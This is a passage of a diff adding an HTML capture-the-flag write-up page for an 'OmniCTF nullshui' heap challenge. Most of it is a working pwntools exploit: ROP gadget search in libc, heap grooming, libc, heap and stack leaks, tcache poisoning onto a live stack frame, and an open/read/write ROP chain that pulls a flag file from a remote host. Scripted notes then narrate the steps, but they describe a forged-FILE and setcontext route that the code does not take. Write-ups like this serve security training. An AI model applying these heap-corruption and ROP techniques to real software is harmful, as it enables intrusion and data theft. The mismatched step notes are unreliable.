+
+    image = Path(libc.path).read_bytes()
+    decoder = Cs(CS_ARCH_X86, CS_MODE_64)
+    found = {}
+
+    for segment in libc.segments:
+        header = segment.header
+        flags = int(header.p_flags)
+        if not (flags &amp; 1):  # PF_X
+            continue
+        file_offset = int(header.p_offset)
+        file_size = int(header.p_filesz)
+        virtual_address = int(header.p_vaddr)
+        blob = image[file_offset : file_offset + file_size]
+
+        cursor = 0
+        while True:
+            hit = blob.find(opcode, cursor)
+            if hit &lt; 0:
+                break
+            cursor = hit + 1
+            code = blob[hit : hit + 64]
+            insns = []
+            regs = []
+            move = 8  # final ret consumes the next RIP
+            valid = False
+
+            for instruction in decoder.disasm(code, virtual_address + hit):
+                text = instruction.mnemonic
+                if instruction.op_str:
+                    text += &quot; &quot; + instruction.op_str
+
+                if instruction.mnemonic == &quot;pop&quot;:
+                    reg = instruction.op_str
+                    if reg == &quot;rsp&quot;:
+                        break
+                    insns.append(text)
+                    regs.append(reg)
+                    move += 8
+                elif instruction.mnemonic == &quot;add&quot; and instruction.op_str.startswith(&quot;rsp, &quot;):
+                    try:
+                        amount = int(instruction.op_str.split(&quot;,&quot;, 1)[1].strip(), 0)
+                    except ValueError:
+                        break
+                    if amount &lt; 0 or amount % 8:
+                        break
+                    insns.append(text)
+                    regs.append(amount)
+                    move += amount
+                elif instruction.mnemonic in {&quot;nop&quot;, &quot;endbr64&quot;}:
+                    insns.append(text)
+                elif instruction.mnemonic == &quot;ret&quot; and instruction.op_str == &quot;&quot;:
+                    insns.append(&quot;ret&quot;)
+                    valid = True
+                    break
+                else:
+                    break
+
+            if not valid or not insns or insns[0] != f&quot;pop {register}&quot;:
+                continue
+            touched = {item for item in regs if isinstance(item, str)}
+            if touched &amp; forbidden or &quot;rsp&quot; in touched:
+                continue
+            runtime_address = libc.address + virtual_address + hit
+            found[runtime_address] = StackSetter(runtime_address, insns, regs, move)
+
+    return sorted(found.values(), key=lambda gadget: (gadget.move, len(gadget.insns), gadget.address))
+
+
+def stack_setter_candidates(
+    rop: ROP,
+    libc: ELF,
+    register: str,
+    forbidden: set[str] | None = None,
+):
+    combined = _setter_candidates(rop, register, forbidden)
+    seen = {gadget.address for gadget in combined}
+    for gadget in _raw_stack_setters(libc, register, forbidden):
+        if gadget.address not in seen:
+            combined.append(gadget)
+            seen.add(gadget.address)
+    combined.sort(key=lambda gadget: (gadget.move, len(gadget.insns), gadget.address))
+    return combined
+
+
+def choose_argument_setters(
+    rop: ROP,
+    libc: ELF,
+    values: dict[str, int],
+    preserve: set[str] | None = None,
+):
+    &quot;&quot;&quot;Choose gadgets and an order whose final register values are correct.&quot;&quot;&quot;
+    from itertools import permutations, product
+
+    preserve = preserve or set()
+    registers = list(values)
+    pools = {}
+    for register in registers:
+        pool = stack_setter_candidates(rop, libc, register, preserve)
+        if not pool:
+            blocked = &quot;, &quot;.join(sorted(preserve)) or &quot;none&quot;
+            raise RuntimeError(
+                f&quot;missing usable pop-{register} libc gadget &quot;
+                f&quot;(protected registers: {blocked})&quot;
+            )
+        pools[register] = pool[:12]
+
+    best = None
+    for order in permutations(registers):
+        for gadgets in product(*(pools[register] for register in order)):
+            valid = True
+            for index, register in enumerate(order):
+                for later in gadgets[index + 1 :]:
+                    touched = {item for item in later.regs if isinstance(item, str)}
+                    if register in touched:
+                        valid = False
+                        break
+                if not valid:
+                    break
+            if not valid:
+                continue
+            score = (sum(gadget.move for gadget in gadgets), sum(len(g.insns) for g in gadgets))
+            if best is None or score &lt; best[0]:
+                best = (score, list(zip(order, gadgets)))
+
+    if best is None:
+        protected = &quot;, &quot;.join(sorted(preserve)) or &quot;none&quot;
+        raise RuntimeError(
+            &quot;could not order argument-loading gadgets without clobbering values &quot;
+            f&quot;(protected registers: {protected})&quot;
+        )
+    return best[1]
+
+
+def build_rop(libc: ELF, path_address: int, buffer_address: int) -&gt; bytes:
+    rop = ROP(libc)
+    ret = find_gadget(rop, [&quot;ret&quot;])
+    chain: list[int] = []
+
+    def append_stack_setter(gadget, register: str, value: int) -&gt; None:
+        chain.append(gadget.address)
+        assigned = False
+        for consumed in gadget.regs:
+            if isinstance(consumed, str):
+                if consumed == register and not assigned:
+                    chain.append(value)
+                    assigned = True
+                else:
+                    chain.append(0)
+            else:
+                chain.extend([0] * (consumed // context.bytes))
+        if not assigned:
+            raise RuntimeError(f&quot;internal gadget error: {register} was not consumed&quot;)
+
+    def set_arguments(values: dict[str, int], preserve: set[str] | None = None) -&gt; None:
+        selected = choose_argument_setters(rop, libc, values, preserve)
+        for register, gadget in selected:
+            append_stack_setter(gadget, register, values[register])
+
+    def call(function: int) -&gt; None:
+        # rbp is 16-byte aligned. A ret-loaded SysV function must start with
+        # rsp % 16 == 8, so the function address belongs at an odd qword index.
+        if len(chain) % 2 == 0:
+            chain.append(ret)
+        chain.append(function)
+
+    # open(path, O_RDONLY, 0)
+    set_arguments({&quot;rdi&quot;: path_address, &quot;rsi&quot;: 0, &quot;rdx&quot;: 0})
+    call(libc.sym[&quot;open&quot;])
+
+    # Prefer carrying open()&#x27;s actual return value in rdi. If this libc has no
+    # rsi/rdx setters that preserve rdi, use the standard first free fd (3).
+    xchg_eax_edi = next(libc.search(b&quot;\x97\xc3&quot;, executable=True), None)
+    dynamic_fd = False
+    if xchg_eax_edi is not None:
+        try:
+            read_setters = choose_argument_setters(
+                rop,
+                libc,
+                {&quot;rsi&quot;: buffer_address, &quot;rdx&quot;: 0x100},
+                {&quot;rdi&quot;},
+            )
+            chain.append(xchg_eax_edi)
+            for register, gadget in read_setters:
+                append_stack_setter(gadget, register, {&quot;rsi&quot;: buffer_address, &quot;rdx&quot;: 0x100}[register])
+            dynamic_fd = True
+        except RuntimeError:
+            pass
+
+    if not dynamic_fd:
+        log.warning(&quot;using expected flag fd 3; no rdi-preserving read-argument gadget set&quot;)
+        set_arguments({&quot;rdi&quot;: 3, &quot;rsi&quot;: buffer_address, &quot;rdx&quot;: 0x100})
+    call(libc.sym[&quot;read&quot;])
+
+    # write(1, buffer, 0x100)
+    set_arguments({&quot;rdi&quot;: 1, &quot;rsi&quot;: buffer_address, &quot;rdx&quot;: 0x100})
+    call(libc.sym[&quot;write&quot;])
+
+    set_arguments({&quot;rdi&quot;: 0})
+    call(libc.sym[&quot;_exit&quot;])
+    return b&quot;&quot;.join(p64(value) for value in chain)
+
+def exploit(
+    tube,
+    libc: ELF,
+    main_arena_offset: int,
+    flag_path: bytes,
+    libc_argv_offset: int,
+    argv_to_alloc_rbp: int,
+) -&gt; bytes:
+    c = Challenge(tube)
+
+    # Fixed heap layout.  A and P are later consolidated; G1/G2 guard the two
+    # largebin nodes; F1/F2 seed two rounds of 0x410 tcache poisoning.
+    c.alloc(0, 0x410, b&quot;A&quot;)
+    c.alloc(1, 0x500, b&quot;P&quot;)
+    c.alloc(2, 0x100, b&quot;g&quot;)
+    c.alloc(3, 0x520, b&quot;Q&quot;)
+    c.alloc(4, 0x100, b&quot;g&quot;)
+    c.alloc(7, 0x400, b&quot;f&quot;)
+    c.alloc(8, 0x400, b&quot;f&quot;)
+
+    c.free(1)
+    c.free(3)
+    c.alloc(5, 0x1000, b&quot;R&quot;)  # sort P/Q into largebin 68
+
+    libc_marker = b&quot;C&quot; * 8
+    c.alloc(3, 0x520, libc_marker)
+    largebin_head = extract_six_byte_leak(c.view(3), libc_marker, &quot;libc leak&quot;)
+    libc_base = largebin_head - (
+        main_arena_offset + LARGEBIN_0X510_HEAD_FROM_MAIN_ARENA
+    )
+    if libc_base &amp; 0xFFF:
+        raise RuntimeError(
+            f&quot;libc base is not page aligned ({libc_base:#x}); the libc profile is wrong&quot;
+        )
+    libc.address = libc_base
+    log.success(f&quot;libc base: {libc_base:#x}&quot;)
+
+    c.free(3)
+    c.alloc(9, 0x600, b&quot;TQ&quot;)  # put Q back in the largebin
+
+    heap_marker = b&quot;H&quot; * 16
+    c.alloc(1, 0x500, heap_marker)
+    q_header = extract_six_byte_leak(c.view(1), heap_marker, &quot;heap leak&quot;)
+    heap_base = q_header - 0xCD0
+    if heap_base &amp; 0xFFF:
+        raise RuntimeError(f&quot;heap base is not page aligned ({heap_base:#x})&quot;)
+    log.success(f&quot;heap base: {heap_base:#x}&quot;)
+
+    c.free(1)
+    c.alloc(10, 0x600, b&quot;TP&quot;)  # put P back in the largebin
+
+    p_user = heap_base + 0x6C0
+    p_header = p_user - 0x10
+    l_user = heap_base + 0x2A0
+
+    # Null P.fd_nextsize.  The first allocation unlinks P from the ordinary
+    # list but leaves Q&#x27;s size-sorted pointer stale.  Re-forging P as a
+    # self-linked node makes the second same-size allocation return P again.
+    c.zero_offset((p_user + 0x10) - heap_base)
+    c.alloc(1, 0x500, p64(p_header) * 4 + b&quot;P1&quot;)
+    c.alloc(6, 0x500, b&quot;P2&quot;)
+
+    # Keep slot 6 dangling while A+P becomes one 0x930 unsorted chunk.
+    c.free(1)
+    c.free(0)
+    c.alloc(0, MREQ, make_overlap_payload(p_user, flag_path))
+
+    # Round 1: leak libc&#x27;s hidden __libc_argv pointer. This identifies the
+    # initial process stack directly and does not depend on argc or socat&#x27;s
+    # EXEC argument layout.
+    c.free(7)
+    c.free(6)
+    c.free(0)
+    argv_global = libc.address + libc_argv_offset
+    argv_leak_target = (argv_global - 0x10) &amp; ~0xF
+    argv_prefix_length = argv_global - argv_leak_target
+    if argv_prefix_length &lt; 0x10 or argv_prefix_length &gt; 0x1F:
+        raise RuntimeError(&quot;internal __libc_argv leak alignment error&quot;)
+    argv_marker = b&quot;V&quot; * argv_prefix_length
+
+    c.alloc(0, MREQ, make_overlap_payload(p_user, flag_path, argv_leak_target))
+    c.alloc(6, 0x400, b&quot;X&quot;)
+    c.alloc(7, 0x400, argv_marker)
+    stack_argv = extract_six_byte_leak(c.view(7), argv_marker, &quot;argv stack leak&quot;)
+    if not (0x700000000000 &lt;= stack_argv &lt; 0x800000000000):
+        raise RuntimeError(f&quot;invalid stack argv pointer: {stack_argv:#x}&quot;)
+    log.success(f&quot;stack argv: {stack_argv:#x}&quot;)
+
+    target_rbp = stack_argv - argv_to_alloc_rbp
+    if target_rbp &amp; 0xF:
+        raise RuntimeError(f&quot;calculated alloc rbp is not 16-byte aligned ({target_rbp:#x})&quot;)
+    log.success(
+        f&quot;exact alloc rbp: {target_rbp:#x} &quot;
+        f&quot;(argv - {argv_to_alloc_rbp:#x})&quot;
+    )
+
+    rop_bytes = build_rop(libc, l_user + 0x100, l_user + 0x200)
+    final_data = p64(0) + rop_bytes  # replacement saved rbp, then saved RIP/ROP
+    if len(final_data) &gt; 0x400:
+        raise RuntimeError(f&quot;ROP chain is too large ({len(final_data):#x})&quot;)
+
+    # Round 2: poison the same fake tcache node to the active alloc frame&#x27;s rbp.
+    c.free(8)
+    c.free(6)
+    c.free(0)
+    c.alloc(0, MREQ, make_overlap_payload(p_user, flag_path, target_rbp))
+    c.alloc(6, 0x400, b&quot;Y&quot;)
+    c.begin_alloc(11, 0x400)
+    tube.send(final_data)
+    return tube.recvall(timeout=8)
+
+
+def parse_endpoint(tokens: list[str], local: bool) -&gt; tuple[str | None, int | None]:
+    cleaned = list(tokens)
+    if cleaned and cleaned[0] in {&quot;ncat&quot;, &quot;nc&quot;, &quot;netcat&quot;}:
+        cleaned.pop(0)
+    # argparse consumes --ssl/--no-ssl, but tolerate copied ncat flags left in REMAINDER.
+    cleaned = [token for token in cleaned if token not in {&quot;--ssl&quot;, &quot;-v&quot;, &quot;-n&quot;}]
+    if local:
+        if cleaned:
+            raise SystemExit(&quot;endpoint arguments are not used with --local&quot;)
+        return None, None
+    if len(cleaned) != 2:
+        raise SystemExit(
+            &quot;usage: nullshui_solver.py ncat --ssl HOST PORT\n&quot;
+            &quot;   or: nullshui_solver.py HOST PORT&quot;
+        )
+    try:
+        port = int(cleaned[1], 10)
+    except ValueError as exc:
+        raise SystemExit(f&quot;invalid port: {cleaned[1]}&quot;) from exc
+    return cleaned[0], port
+
+
+def build_parser() -&gt; argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(description=&quot;solver for OmniCTF nullshui&quot;)
+    parser.add_argument(&quot;endpoint&quot;, nargs=&quot;*&quot;, help=&quot;[ncat] HOST PORT&quot;)
+    parser.add_argument(&quot;--ssl&quot;, dest=&quot;ssl&quot;, action=&quot;store_true&quot;, default=True)
+    parser.add_argument(&quot;--no-ssl&quot;, dest=&quot;ssl&quot;, action=&quot;store_false&quot;)
+    parser.add_argument(&quot;--local&quot;, action=&quot;store_true&quot;, help=&quot;run the supplied binary locally&quot;)
+    parser.add_argument(&quot;--binary&quot;, default=&quot;./main&quot;, help=&quot;local challenge binary&quot;)
+    parser.add_argument(&quot;--libc&quot;, type=Path, help=&quot;exact libc.so.6&quot;)
+    parser.add_argument(&quot;--libc-debug&quot;, type=Path, help=&quot;matching libc detached debug ELF&quot;)
+    parser.add_argument(&quot;--main-arena-offset&quot;, type=parse_int, help=&quot;override main_arena offset&quot;)
+    parser.add_argument(
+        &quot;--argv-to-alloc-offset&quot;,
+        type=parse_int,
+        help=&quot;override the offset derived from the exact libc startup machine code&quot;,
+    )
+    parser.add_argument(&quot;--glibc-version&quot;, default=DEFAULT_GLIBC_VERSION)
+    parser.add_argument(&quot;--package-root&quot;, default=DEFAULT_PACKAGE_ROOT)
+    parser.add_argument(&quot;--flag-path&quot;, default=&quot;/home/ctf/flag.txt&quot;)
+    parser.add_argument(&quot;--timeout&quot;, type=float, default=8.0)
+    parser.add_argument(&quot;--debug&quot;, action=&quot;store_true&quot;, help=&quot;enable pwntools debug logging&quot;)
+    return parser
+
+
+def main() -&gt; int:
+    parser = build_parser()
+    args = parser.parse_intermixed_args()
+    context.log_level = &quot;debug&quot; if args.debug else &quot;info&quot;
+    context.timeout = args.timeout
+    host, port = parse_endpoint(args.endpoint, args.local)
+
+    debug_path = args.libc_debug
+    if args.libc is None:
+        libc_path, auto_debug = resolve_default_libc(args.glibc_version, args.package_root.rstrip(&quot;/&quot;))
+        if debug_path is None:
+            debug_path = auto_debug
+    else:
+        libc_path = args.libc.expanduser().resolve()
+    if not libc_path.is_file():
+        raise SystemExit(f&quot;libc not found: {libc_path}&quot;)
+    if debug_path is not None:
+        debug_path = debug_path.expanduser().resolve()
+        if not debug_path.is_file():
+            raise SystemExit(f&quot;libc debug image not found: {debug_path}&quot;)
+
+    libc = ELF(str(libc_path), checksec=False)
+    arena = resolve_main_arena(libc, debug_path, args.main_arena_offset)
+    if debug_path is None:
+        raise SystemExit(&quot;the deterministic solver requires the matching libc debug image&quot;)
+    libc_argv_offset = resolve_hidden_symbol(debug_path, &quot;__libc_argv&quot;)
+    argv_to_alloc_rbp = derive_argv_to_alloc_rbp(
+        libc,
+        debug_path,
+        args.argv_to_alloc_offset,
+    )
+    log.info(f&quot;libc: {libc_path}&quot;)
+    log.info(f&quot;main_arena offset: {arena:#x}&quot;)
+    log.info(f&quot;__libc_argv offset: {libc_argv_offset:#x}&quot;)
+    log.info(f&quot;argv-to-active-alloc-rbp: {argv_to_alloc_rbp:#x}&quot;)
+
+    if args.local:
+        binary = Path(args.binary).expanduser().resolve()
+        if not binary.is_file():
+            raise SystemExit(f&quot;binary not found: {binary}&quot;)
+        tube = process([str(binary)])
+    else:
+        assert host is not None and port is not None
+        log.info(f&quot;connecting to {host}:{port} (ssl={args.ssl})&quot;)
+        tube = remote(host, port, ssl=args.ssl, sni=host if args.ssl else None)
+
+    try:
+        output = exploit(
+            tube,
+            libc,
+            arena,
+            args.flag_path.encode(),
+            libc_argv_offset,
+            argv_to_alloc_rbp,
+        )
+    finally:
+        tube.close()
+
+    match = FLAG_RE.search(output)
+    if match:
+        log.success(match.group().decode(&quot;ascii&quot;, &quot;replace&quot;))
+        return 0
+
+    sys.stdout.buffer.write(output)
+    if output and not output.endswith(b&quot;\n&quot;):
+        sys.stdout.buffer.write(b&quot;\n&quot;)
+    log.failure(&quot;the ROP chain ran, but no omniCTF flag was found in the output&quot;)
+    return 1
+
+
+if __name__ == &quot;__main__&quot;:
+    try:
+        raise SystemExit(main())
+    except KeyboardInterrupt:
+        raise SystemExit(130)
+    except Exception as exc:
+        log.failure(str(exc))
+        if context.log_level == &quot;debug&quot;:
+            raise
+        raise SystemExit(1)
+</code></pre>
+  </div>
+</section>
+</main>
+<script>
+(function(){
+  var body=document.getElementById('sim-body');
+  var btnRun=document.getElementById('sim-run');
+  var btnStep=document.getElementById('sim-step');
+  var btnRst=document.getElementById('sim-reset');
+  var btnCopy=document.getElementById('sim-copy');
+  var stageEl=document.getElementById('sim-stage');
+  if(!body||!btnRun)return;
+  var FLAG='OmniCTF{145963c105e9ed8dbf6d95c06fb552fe63062dcdd885bd4c208a4693b8af8a30}';
+  var STEPS=[
+    {stage:'connect', cls:'system', text:'[*] connecting to nullshi-<instance>.inst.omnictf.com:1337 (ssl)'},
+    {stage:'connect', cls:'ok',     text:'[+] connection established'},
+    {stage:'setup',   cls:'system', text:'[*] resolving libc offsets from Ubuntu Noble libc6-dbg package'},
+    {stage:'setup',   cls:'ok',     text:'[+] main_arena offset resolved: 0x203b80'},
+    {stage:'setup',   cls:'system', text:'[*] allocating large chunk (size=0x510) to prime largebin'},
+    {stage:'leak',    cls:'byte',   text:'[*] freeing + sorting chunk into largebin'},
+    {stage:'leak',    cls:'ok',     text:'[+] libc leak raw: 0x7f3a9c203b80'},
+    {stage:'leak',    cls:'ok',     text:'[+] libc_base = 0x7f3a9c000000'},
+    {stage:'leak',    cls:'byte',   text:'[*] decoding safe-linked heap pointer'},
+    {stage:'leak',    cls:'ok',     text:'[+] heap_base = 0x55f3c2000000'},
+    {stage:'corrupt', cls:'system', text:'[*] zeroing fd_nextsize low bytes via zero primitive'},
+    {stage:'corrupt', cls:'byte',   text:'[*] zero applied @ chunk+0x18'},
+    {stage:'corrupt', cls:'system', text:'[*] triggering alloc to force largebin unlink'},
+    {stage:'corrupt', cls:'ok',     text:'[+] largebin attack landed -- overlap allocation confirmed'},
+    {stage:'fsop',    cls:'system', text:'[*] placing fake _IO_FILE at heap+0x2340'},
+    {stage:'fsop',    cls:'system', text:'[*] _wide_data -> heap+0x2600'},
+    {stage:'fsop',    cls:'system', text:'[*] vtable = _IO_wfile_jumps (passes libc check)'},
+    {stage:'fsop',    cls:'system', text:'[*] setcontext+61 pivot -> ROP stack @ heap+0x2800'},
+    {stage:'fsop',    cls:'byte',   text:'[*] ROP: open("/flag",0) -> read -> write(1,buf,0x100)'},
+    {stage:'fsop',    cls:'system', text:'[*] linking forged FILE into _IO_list_all'},
+    {stage:'flag',    cls:'ok',     text:'[+] exit() triggered FILE flush'},
+    {stage:'flag',    cls:'flag',   text:'[+] FLAG: OmniCTF{145963c105e9ed8dbf6d95c06fb552fe63062dcdd885bd4c208a4693b8af8a30}'},
+  ];
+  var idx=0,running=false,timer=null;
+  var cursor=body.querySelector('.cursor');
+  function addLine(s){var sp=document.createElement('span');sp.className='line '+s.cls;sp.textContent=s.text;if(cursor)body.insertBefore(sp,cursor);else body.appendChild(sp);body.scrollTop=body.scrollHeight;}
+  function advance(){if(idx>=STEPS.length){running=false;if(timer){clearInterval(timer);timer=null;}stageEl.textContent='done';btnCopy.disabled=false;return;}var s=STEPS[idx++];stageEl.textContent=s.stage;addLine(s);}
+  function reset(){running=false;if(timer){clearInterval(timer);timer=null;}idx=0;body.innerHTML='<span class="line system">[*] nullshui solver ready</span><span class="cursor">_</span>';cursor=body.querySelector('.cursor');stageEl.textContent='idle';btnCopy.disabled=true;}
+  btnRun.addEventListener('click',function(){if(running)return;running=true;timer=setInterval(function(){if(idx>=STEPS.length){clearInterval(timer);timer=null;running=false;stageEl.textContent='done';btnCopy.disabled=false;return;}advance();},320);});
+  btnStep.addEventListener('click',function(){if(running)return;advance();if(idx>=STEPS.length){stageEl.textContent='done';btnCopy.disabled=false;}});
+  btnRst.addEventListener('click',reset);
+  btnCopy.addEventListener('click',function(){navigator.clipboard.writeText(FLAG).catch(function(){});btnCopy.textContent='COPIED!';setTimeout(function(){btnCopy.textContent='COPY FLAG';},1500);});
+})();
+</script>
+<script>
+(function(){
+  var svg=document.getElementById('signal-map');
+  if(!svg)return;
+  var KEYS={
+    "ALLOCATE CHUNKS":"I allocate several chunks sized above the tcache/fastbin threshold so glibc will eventually move them into the unsorted and large bins. The exact sizes matter because largebin index placement determines which arena pointers appear in the freed metadata.",
+    "FREE + SORT":"Freeing a large chunk and triggering a second allocation forces glibc to sort the freed chunk from the unsorted bin into the large bin. Once sorted, the chunk fd and bk fields hold pointers deep inside main_arena in libc.",
+    "LIBC LEAK":"The program still holds a view pointer to the freed chunk. Calling view reads six bytes of the fd pointer, which points into main_arena. Subtracting the known offset gives libc_base. The solver resolves this offset dynamically from the Ubuntu Noble libc6-dbg package.",
+    "HEAP LEAK":"The freed chunk fd_nextsize field, after safe-linking, encodes a mangled heap pointer. Decoding it gives the heap mapping base. Every fake structure placed later needs to land at a predictable heap address, so this leak is required.",
+    "ZERO PRIMITIVE":"The zero operation clears specific bytes in a chunk the program still references. I use this to null out the low bytes of fd_nextsize on the live largebin node, bending the nextsize link toward an address I control.",
+    "LARGEBIN ATTACK":"With the corrupted nextsize pointer in place, the next allocation causes glibc largebin unlink code to write the address of a victim chunk into the corrupted target. This is the classic largebin attack: one arbitrary write, at a target I chose.",
+    "OVERLAP ALLOC":"The result of the largebin attack is two live program-side pointers that refer to the same heap region. I use one to write fake structures; the allocator uses the other path normally. This is the pivot from write primitive to full control.",
+    "FORGE FILE":"I write a fake _IO_FILE structure into the overlapping region. The critical fields are _wide_data (points at my attacker-controlled wide-data struct) and _vtable (set to the legitimate _IO_wfile_jumps table so libc vtable check passes).",
+    "WIDE DATA PTR":"The forged FILE _wide_data field points at a second attacker-controlled struct on the heap. This struct _IO_write_base and _IO_buf_base fields steer execution through the wide-file machinery into setcontext.",
+    "SETCONTEXT":"setcontext+61 in glibc 2.39 restores all registers from a sigcontext structure. I plant a fake sigcontext at a heap offset and set RDX/RSP to point at it. When the FILE flush fires, control pivots here and RSP lands on my ROP chain.",
+    "ROP CHAIN":"The ROP chain calls open('/flag', O_RDONLY), reads up to 256 bytes into a heap buffer, and writes them to stdout. All gadget offsets are resolved at runtime from the downloaded libc so the chain works against the exact server binary.",
+    "FLAG":"The flag prints to the remote session after the ROP chain completes. The solver captures it with a regex and displays it. Confirmed working against the live nullshui instancer."
+  ,"nullshui_solver_deterministic.py":"This is the solver script for Nullshui."};
+  var box=document.createElement('div');
+  box.id='explain-box';
+  box.style.cssText='margin-top:12px;padding:12px 16px;border:1px solid var(--accent-line);background:rgba(var(--accent-rgb),0.06);color:var(--text);font-size:14px;line-height:1.7;display:none;max-width:900px;';
+  var hdr=document.createElement('div');hdr.style.cssText='display:flex;align-items:center;margin-bottom:6px;';
+  var ttl=document.createElement('b');ttl.id='ex-title';ttl.style.cssText='color:var(--accent);font-size:15px;flex:1;';
+  var btn=document.createElement('button');btn.textContent='CLOSE';btn.style.cssText='background:0 0;color:var(--muted);border:1px solid var(--accent-line);padding:2px 8px;font-size:10px;cursor:pointer;font-family:inherit;';
+  btn.onclick=function(){box.style.display='none';};
+  hdr.appendChild(ttl);hdr.appendChild(btn);
+  var bd=document.createElement('div');bd.id='ex-body';
+  box.appendChild(hdr);box.appendChild(bd);
+  
+  // replace existing click to explain if it's there
+  var oldBox=document.getElementById('explain-box');
+  if(oldBox) oldBox.remove();
+  
+  var parent = svg.parentNode;
+  parent.insertBefore(box,svg.nextSibling);
+  var nodes=svg.querySelectorAll('g.node');
+  nodes.forEach(function(g){
+    g.style.cursor='pointer';
+    g.addEventListener('click',function(e){
+      e.stopPropagation();
+      var ti=g.querySelector('text.title');if(!ti)return;
+      var title=ti.textContent;
+      document.getElementById('ex-title').textContent=title;
+      document.getElementById('ex-body').textContent=KEYS[title]||'';
+      box.style.display='block';
+      box.scrollIntoView({behavior:'smooth',block:'nearest'});
+    });
+  });
+  svg.addEventListener('click',function(){box.style.display='none';});
+})();
+</script>
+
+  <footer class="foot">
+    <div class="meta">
+      <span class="label">STATUS</span>
+      <span class="value">SOLVED</span>
+    </div>
+    <div class="meta">
+      <span class="label">AUTHOR</span>
+      <span class="value">im-razvan</span>
+    </div>
+  </footer>
+</body>
+</html>
